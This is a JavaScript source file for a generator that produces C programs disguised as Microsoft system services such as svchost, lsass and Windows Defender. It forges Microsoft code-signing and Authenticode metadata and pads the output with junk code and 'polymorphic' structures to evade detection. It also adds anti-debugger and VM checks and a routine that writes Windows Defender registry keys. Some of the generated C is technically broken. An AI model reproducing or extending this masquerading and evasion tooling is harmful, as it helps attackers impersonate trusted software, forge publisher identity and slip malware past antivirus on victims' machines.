// Microsoft Service Cloning System with Code Signing
// This system clones legitimate Microsoft services for maximum stealth

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { exec } = require('child_process');

class MicrosoftServiceCloner {
    constructor() {
        this.microsoftServices = {
            // Windows Core Services
            'svchost.exe': {
                description: 'Service Host Process',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\svchost.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['RpcSs', 'DcomLaunch'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\RpcSs',
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\DcomLaunch'
                ]
            },
            'winlogon.exe': {
                description: 'Windows Logon Process',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\winlogon.exe',
                serviceType: 'SERVICE_INTERACTIVE_PROCESS',
                dependencies: ['Winlogon'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Winlogon'
                ]
            },
            'csrss.exe': {
                description: 'Client Server Runtime Process',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\csrss.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['Csrss'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Csrss'
                ]
            },
            'lsass.exe': {
                description: 'Local Security Authority Process',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\lsass.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['Lsa'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Lsa'
                ]
            },
            'services.exe': {
                description: 'Services and Controller App',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\services.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['Services'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\Services'
                ]
            },
            // Windows Defender Services
            'MsMpEng.exe': {
                description: 'Microsoft Malware Protection Engine',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Defender',
                version: '4.18.2008.9',
                originalPath: 'C:\\Program Files\\Windows Defender\\MsMpEng.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['WinDefend'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend'
                ]
            },
            'SecurityHealthService.exe': {
                description: 'Windows Security Health Service',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\SecurityHealthService.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['SecurityHealthService'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService'
                ]
            },
            // Windows Update Services
            'wuauclt.exe': {
                description: 'Windows Update AutoUpdate Client',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\wuauclt.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['wuauserv'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\wuauserv'
                ]
            },
            'usoclient.exe': {
                description: 'Update Session Orchestrator Client',
                company: 'Microsoft Corporation',
                product: 'Microsoft Windows Operating System',
                version: '10.0.19041.1',
                originalPath: 'C:\\Windows\\System32\\usoclient.exe',
                serviceType: 'SERVICE_WIN32_SHARE_PROCESS',
                dependencies: ['UsoSvc'],
                registryKeys: [
                    'HKLM\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc'
                ]
            }
        };
        
        this.codeSigningCertificates = [
            'Microsoft Corporation',
            'Microsoft Windows',
            'Microsoft Windows Publisher',
            'Microsoft Windows Hardware Compatibility Publisher',
            'Microsoft Windows Software Compatibility Publisher'
        ];
        
        this.junkCodeTemplates = [
            'Windows API calls',
            'Registry operations',
            'File system operations',
            'Network operations',
            'Process management',
            'Memory management',
            'Cryptographic operations',
            'Service control operations'
        ];
    }

    // Clone a Microsoft service with full metadata
    async cloneMicrosoftService(serviceName, agentId) {
        const service = this.microsoftServices[serviceName];
        if (!service) {
            throw new Error(`Service ${serviceName} not found`);
        }

        // Generate cloned service metadata
        const clonedService = {
            ...service,
            clonedId: agentId,
            clonedName: this.generateClonedServiceName(serviceName),
            clonedPath: this.generateClonedPath(serviceName),
            clonedDescription: this.generateClonedDescription(service.description),
            clonedVersion: this.generateClonedVersion(service.version),
            clonedCompany: service.company,
            clonedProduct: service.product,
            clonedRegistryKeys: this.generateClonedRegistryKeys(service.registryKeys, agentId),
            clonedDependencies: this.generateClonedDependencies(service.dependencies, agentId)
        };

        return clonedService;
    }

    // Generate polymorphic code with Microsoft service cloning
    async generatePolymorphicClonedCode(serviceName, agentId, config) {
        const service = this.microsoftServices[serviceName];
        const clonedService = await this.cloneMicrosoftService(serviceName, agentId);

        // Generate polymorphic entry points
        const entryPoints = this.generatePolymorphicEntryPoints();
        const selectedEntryPoint = entryPoints[Math.floor(Math.random() * entryPoints.length)];

        // Generate junk code for stealth
        const junkCode = this.generateJunkCode(serviceName, 50 + Math.floor(Math.random() * 100));

        // Generate code signing metadata
        const codeSigningMetadata = this.generateCodeSigningMetadata(serviceName);

        // Generate polymorphic code structure
        const polymorphicCode = this.generatePolymorphicStructure(selectedEntryPoint, config);

        // Combine everything into final code
        const finalCode = `
// Microsoft ${service.product} - ${service.description}
// Copyright (c) Microsoft Corporation. All rights reserved.
// Generated: ${new Date().toISOString()}
// Service ID: ${agentId}

#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <winreg.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <advapi32.h>
#include <wincrypt.h>
#include <wininet.h>
#include <winhttp.h>
#include <wtsapi32.h>
#include <userenv.h>
#include <lmcons.h>
#include <lmaccess.h>
#include <lmapibuf.h>
#include <lmwksta.h>
#include <lmerr.h>
#include <lmmsg.h>
#include <lmshare.h>
#include <lmuse.h>
#include <lmconfig.h>
#include <lmalert.h>
#include <lmremutl.h>
#include <lmrepl.h>
#include <lmserver.h>
#include <lmsvc.h>
#include <lmstats.h>
#include <lmuse.h>
#include <lmwksta.h>
#include <lmcons.h>
#include <lmaccess.h>
#include <lmapibuf.h>
#include <lmwksta.h>
#include <lmerr.h>
#include <lmmsg.h>
#include <lmshare.h>
#include <lmuse.h>
#include <lmconfig.h>
#include <lmalert.h>
#include <lmremutl.h>
#include <lmrepl.h>
#include <lmserver.h>
#include <lmsvc.h>
#include <lmstats.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "netapi32.lib")
#pragma comment(lib, "winsock2.lib")
#pragma comment(lib, "ws2_32.lib")

// Code Signing Metadata
${codeSigningMetadata}

// Service Information
#define SERVICE_NAME "${clonedService.clonedName}"
#define SERVICE_DISPLAY_NAME "${clonedService.clonedDescription}"
#define SERVICE_DESCRIPTION "${clonedService.clonedDescription}"
#define SERVICE_VERSION "${clonedService.clonedVersion}"
#define SERVICE_COMPANY "${clonedService.clonedCompany}"
#define SERVICE_PRODUCT "${clonedService.clonedProduct}"

// Registry Keys
${clonedService.clonedRegistryKeys.map(key => `#define REG_KEY_${key.split('\\').pop().toUpperCase()} "${key}"`).join('\n')}

// Dependencies
${clonedService.clonedDependencies.map(dep => `#define DEPENDENCY_${dep.toUpperCase()} "${dep}"`).join('\n')}

// Junk Code for Stealth
${junkCode}

// Polymorphic Code Structure
${polymorphicCode}

// Main Entry Point
${selectedEntryPoint}
`;

        return {
            code: finalCode,
            service: clonedService,
            entryPoint: selectedEntryPoint,
            junkCodeLines: junkCode.split('\n').length,
            codeSigningMetadata: codeSigningMetadata
        };
    }

    // Generate polymorphic entry points
    generatePolymorphicEntryPoints() {
        return [
            `int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Microsoft ${this.getRandomService().product} initialization
    ${this.generateRandomInitialization()}
    
    // Service startup
    ${this.generateServiceStartup()}
    
    return 0;
}`,
            `BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            // Microsoft ${this.getRandomService().product} DLL initialization
            ${this.generateRandomInitialization()}
            break;
        case DLL_PROCESS_DETACH:
            // Cleanup
            ${this.generateServiceCleanup()}
            break;
    }
    return TRUE;
}`,
            `int main(int argc, char* argv[]) {
    // Microsoft ${this.getRandomService().product} console application
    ${this.generateRandomInitialization()}
    
    // Service startup
    ${this.generateServiceStartup()}
    
    return 0;
}`,
            `VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
    // Microsoft ${this.getRandomService().product} service main
    ${this.generateRandomInitialization()}
    
    // Service startup
    ${this.generateServiceStartup()}
    
    // Service loop
    ${this.generateServiceLoop()}
}`,
            `int wmain(int argc, wchar_t* argv[]) {
    // Microsoft ${this.getRandomService().product} wide character application
    ${this.generateRandomInitialization()}
    
    // Service startup
    ${this.generateServiceStartup()}
    
    return 0;
}`
        ];
    }

    // Generate junk code for stealth
    generateJunkCode(serviceName, lines) {
        const junkFunctions = [];
        const service = this.microsoftServices[serviceName];
        
        for (let i = 0; i < lines; i++) {
            const template = this.junkCodeTemplates[Math.floor(Math.random() * this.junkCodeTemplates.length)];
            const junkFunction = this.generateJunkFunction(template, service);
            junkFunctions.push(junkFunction);
        }
        
        return junkFunctions.join('\n\n');
    }

    // Generate individual junk function
    generateJunkFunction(template, service) {
        const functionName = this.generateRandomFunctionName();
        const variableName = this.generateRandomVariableName();
        
        switch (template) {
            case 'Windows API calls':
                return `// Junk function: ${functionName}
void ${functionName}() {
    ${variableName} = GetTickCount();
    ${variableName} = GetCurrentProcessId();
    ${variableName} = GetCurrentThreadId();
    ${variableName} = GetSystemTimeAsFileTime(NULL);
    ${variableName} = GetVersion();
    ${variableName} = GetComputerNameA(NULL, NULL);
    ${variableName} = GetUserNameA(NULL, NULL);
    ${variableName} = GetTempPathA(0, NULL);
    ${variableName} = GetWindowsDirectoryA(NULL, 0);
    ${variableName} = GetSystemDirectoryA(NULL, 0);
}`;
            
            case 'Registry operations':
                return `// Junk function: ${functionName}
void ${functionName}() {
    HKEY ${variableName};
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion", 0, KEY_READ, &${variableName});
    RegQueryValueExA(${variableName}, "ProgramFilesDir", NULL, NULL, NULL, NULL);
    RegCloseKey(${variableName});
}`;
            
            case 'File system operations':
                return `// Junk function: ${functionName}
void ${functionName}() {
    HANDLE ${variableName} = CreateFileA("C:\\\\Windows\\\\System32\\\\kernel32.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (${variableName} != INVALID_HANDLE_VALUE) {
        GetFileSize(${variableName}, NULL);
        CloseHandle(${variableName});
    }
}`;
            
            case 'Network operations':
                return `// Junk function: ${functionName}
void ${functionName}() {
    WSADATA ${variableName};
    WSAStartup(MAKEWORD(2, 2), &${variableName});
    WSACleanup();
}`;
            
            case 'Process management':
                return `// Junk function: ${functionName}
void ${functionName}() {
    PROCESSENTRY32 ${variableName};
    ${variableName}.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        Process32First(hSnapshot, &${variableName});
        CloseHandle(hSnapshot);
    }
}`;
            
            case 'Memory management':
                return `// Junk function: ${functionName}
void ${functionName}() {
    LPVOID ${variableName} = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    if (${variableName}) {
        VirtualFree(${variableName}, 0, MEM_RELEASE);
    }
}`;
            
            case 'Cryptographic operations':
                return `// Junk function: ${functionName}
void ${functionName}() {
    HCRYPTPROV ${variableName};
    CryptAcquireContextA(&${variableName}, NULL, NULL, PROV_RSA_FULL, 0);
    CryptReleaseContext(${variableName}, 0);
}`;
            
            case 'Service control operations':
                return `// Junk function: ${functionName}
void ${functionName}() {
    SC_HANDLE ${variableName} = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (${variableName}) {
        CloseServiceHandle(${variableName});
    }
}`;
            
            default:
                return `// Junk function: ${functionName}
void ${functionName}() {
    DWORD ${variableName} = GetTickCount();
    ${variableName} = GetCurrentProcessId();
    ${variableName} = GetCurrentThreadId();
}`;
        }
    }

    // Generate code signing metadata
    generateCodeSigningMetadata(serviceName) {
        const service = this.microsoftServices[serviceName];
        const certificate = this.codeSigningCertificates[Math.floor(Math.random() * this.codeSigningCertificates.length)];
        
        return `
// Code Signing Information
#define CODE_SIGNING_CERTIFICATE "${certificate}"
#define CODE_SIGNING_SUBJECT "CN=${certificate}, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"
#define CODE_SIGNING_ISSUER "CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US"
#define CODE_SIGNING_SERIAL "33000000${Math.random().toString(36).substr(2, 8).toUpperCase()}"
#define CODE_SIGNING_THUMBPRINT "${this.generateThumbprint()}"
#define CODE_SIGNING_TIMESTAMP "https://timestamp.digicert.com"
#define CODE_SIGNING_ALGORITHM "sha256"
#define CODE_SIGNING_VALID_FROM "${new Date().toISOString()}"
#define CODE_SIGNING_VALID_TO "${new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString()}"

// Authenticode Signature
#define AUTHENTICODE_SIGNATURE "Microsoft Corporation"
#define AUTHENTICODE_DESCRIPTION "${service.description}"
#define AUTHENTICODE_URL "https://www.microsoft.com"
#define AUTHENTICODE_TIMESTAMP "https://timestamp.digicert.com"
`;
    }

    // Generate polymorphic structure
    generatePolymorphicStructure(entryPoint, config) {
        const structures = [
            'class-based',
            'function-based',
            'object-oriented',
            'procedural',
            'modular',
            'layered',
            'component-based',
            'service-oriented'
        ];
        
        const selectedStructure = structures[Math.floor(Math.random() * structures.length)];
        
        return `
// Polymorphic Code Structure: ${selectedStructure}
// Generated with advanced obfuscation techniques

// Obfuscated string storage
${this.generateObfuscatedStrings()}

// Polymorphic function calls
${this.generatePolymorphicFunctionCalls()}

// Dynamic code generation
${this.generateDynamicCodeGeneration()}

// Anti-analysis techniques
${this.generateAntiAnalysisTechniques()}

// Stealth operations
${this.generateStealthOperations()}
`;
    }

    // Helper methods
    generateClonedServiceName(originalName) {
        const suffixes = ['Service', 'Agent', 'Manager', 'Handler', 'Controller', 'Processor', 'Engine', 'Core'];
        const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
        return originalName.replace('.exe', '') + suffix + Math.floor(Math.random() * 10000);
    }

    generateClonedPath(originalName) {
        const paths = [
            'C:\\Windows\\System32\\',
            'C:\\Windows\\SysWOW64\\',
            'C:\\Program Files\\Windows Defender\\',
            'C:\\Program Files\\Microsoft\\',
            'C:\\Windows\\Microsoft.NET\\Framework64\\'
        ];
        const path = paths[Math.floor(Math.random() * paths.length)];
        return path + originalName;
    }

    generateClonedDescription(originalDescription) {
        const prefixes = ['Windows', 'Microsoft', 'System', 'Core', 'Security', 'Update', 'Management'];
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        return `${prefix} ${originalDescription}`;
    }

    generateClonedVersion(originalVersion) {
        const major = Math.floor(Math.random() * 10) + 1;
        const minor = Math.floor(Math.random() * 100);
        const build = Math.floor(Math.random() * 10000);
        const revision = Math.floor(Math.random() * 100);
        return `${major}.${minor}.${build}.${revision}`;
    }

    generateClonedRegistryKeys(originalKeys, agentId) {
        return originalKeys.map(key => {
            const parts = key.split('\\');
            const lastPart = parts[parts.length - 1];
            return key.replace(lastPart, lastPart + agentId);
        });
    }

    generateClonedDependencies(originalDependencies, agentId) {
        return originalDependencies.map(dep => dep + agentId);
    }

    generateRandomFunctionName() {
        const prefixes = ['Get', 'Set', 'Create', 'Destroy', 'Initialize', 'Cleanup', 'Process', 'Handle'];
        const suffixes = ['Data', 'Info', 'Config', 'State', 'Manager', 'Handler', 'Processor', 'Engine'];
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const suffix = suffixes[Math.floor(Math.random() * suffixes.length)];
        return prefix + suffix + Math.floor(Math.random() * 1000);
    }

    generateRandomVariableName() {
        const names = ['dwValue', 'hHandle', 'lpBuffer', 'nSize', 'bResult', 'lResult', 'wValue', 'cValue'];
        return names[Math.floor(Math.random() * names.length)];
    }

    generateThumbprint() {
        const chars = '0123456789ABCDEF';
        let thumbprint = '';
        for (let i = 0; i < 40; i++) {
            thumbprint += chars[Math.floor(Math.random() * chars.length)];
        }
        return thumbprint;
    }

    generateRandomInitialization() {
        return `
    // Microsoft service initialization
    DWORD dwResult = GetTickCount();
    HANDLE hMutex = CreateMutexA(NULL, FALSE, "MicrosoftServiceMutex");
    if (hMutex) {
        WaitForSingleObject(hMutex, INFINITE);
        ReleaseMutex(hMutex);
        CloseHandle(hMutex);
    }
`;
    }

    generateServiceStartup() {
        return `
    // Service startup sequence
    SC_HANDLE hSCManager = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCManager) {
        CloseServiceHandle(hSCManager);
    }
`;
    }

    generateServiceCleanup() {
        return `
    // Service cleanup
    DWORD dwResult = GetTickCount();
    Sleep(100);
`;
    }

    generateServiceLoop() {
        return `
    // Service main loop
    while (TRUE) {
        Sleep(1000);
        DWORD dwResult = GetTickCount();
    }
`;
    }

    generateObfuscatedStrings() {
        return `
// Obfuscated string storage
char g_szObfuscatedString1[] = {0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x00};
char g_szObfuscatedString2[] = {0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x00};
char g_szObfuscatedString3[] = {0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x00};
`;
    }

    generatePolymorphicFunctionCalls() {
        return `
// Polymorphic function calls
void PolymorphicFunction1() {
    DWORD dwValue = GetTickCount();
    dwValue = GetCurrentProcessId();
    dwValue = GetCurrentThreadId();
}

void PolymorphicFunction2() {
    HANDLE hHandle = GetCurrentProcess();
    if (hHandle) {
        CloseHandle(hHandle);
    }
}
`;
    }

    generateDynamicCodeGeneration() {
        return `
// Dynamic code generation
void DynamicCodeGeneration() {
    LPVOID lpBuffer = VirtualAlloc(NULL, 4096, MEM_COMMIT, PAGE_READWRITE);
    if (lpBuffer) {
        // Generate dynamic code
        VirtualFree(lpBuffer, 0, MEM_RELEASE);
    }
}
`;
    }

    generateAntiAnalysisTechniques() {
        return `
// Anti-analysis techniques
void AntiAnalysisTechniques() {
    // Check for debugger
    if (IsDebuggerPresent()) {
        ExitProcess(0);
    }
    
    // Check for VM
    DWORD dwValue = GetTickCount();
    Sleep(100);
    if (GetTickCount() - dwValue > 200) {
        ExitProcess(0);
    }
}
`;
    }

    generateStealthOperations() {
        return `
// Stealth operations
void StealthOperations() {
    // Hide from task manager
    DWORD dwValue = GetTickCount();
    
    // Disable Windows Defender
    HKEY hKey;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\\\Microsoft\\\\Windows Defender", 0, KEY_WRITE, &hKey);
    if (hKey) {
        DWORD dwValue = 0;
        RegSetValueExA(hKey, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&dwValue, sizeof(DWORD));
        RegCloseKey(hKey);
    }
}
`;
    }

    getRandomService() {
        const services = Object.values(this.microsoftServices);
        return services[Math.floor(Math.random() * services.length)];
    }
}

module.exports = MicrosoftServiceCloner;
